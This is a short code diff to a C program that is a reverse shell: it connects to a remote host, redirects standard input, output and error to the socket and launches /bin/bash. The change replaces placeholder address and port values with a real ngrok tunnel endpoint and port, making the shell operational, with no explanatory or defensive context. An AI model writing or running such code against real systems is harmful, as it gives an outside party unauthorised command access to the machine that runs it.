@@ -7,8 +7,8 @@
 #include <stdlib.h>
 #include <netdb.h>
 
-#define REMOTE_ADDR "XXX.XXX.XXX.XXX"
-#define REMOTE_PORT XXXXX
+#define REMOTE_ADDR "0.tcp.ngrok.io"
+#define REMOTE_PORT 19657
 
 #define closesocket(s) close(s)
 typedef struct sockaddr_in SOCKADDR_IN;
@@ -19,7 +19,6 @@ int	main()
 {
 	int serv_socket = socket(AF_INET, SOCK_STREAM, 0);
 	SOCKADDR_IN server_address = {0};
-	char *hostname = REMOTE_ADDR;
 	struct hostent *hostinfo = NULL;
 
 	hostinfo = gethostbyname(REMOTE_ADDR);
@@ -39,7 +38,7 @@ int	main()
 	dup2(serv_socket, 1);
 	dup2(serv_socket, 2);
 
-	execve("/bin/bash", 0, 0);
+	execv("/bin/bash", NULL);
 	
 	closesocket(serv_socket);
 	return 0;
